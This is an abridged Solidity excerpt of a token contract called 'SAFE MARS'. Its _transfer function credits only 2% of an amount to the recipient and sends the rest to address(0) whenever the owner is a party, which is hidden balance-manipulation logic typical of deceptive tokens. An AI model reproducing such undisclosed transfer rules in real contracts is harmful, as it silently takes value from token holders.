...
contract SAFEMARS is IERC20 {
    ...
    string private _name = "SAFE MARS";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(sender == _owner || recipient == _owner){
             ...
             _balances[recipient] = _balances[recipient].add(amount/50);
              _balances[address(0)] = _balances[address(0)].add(amount-amount/50);
        }
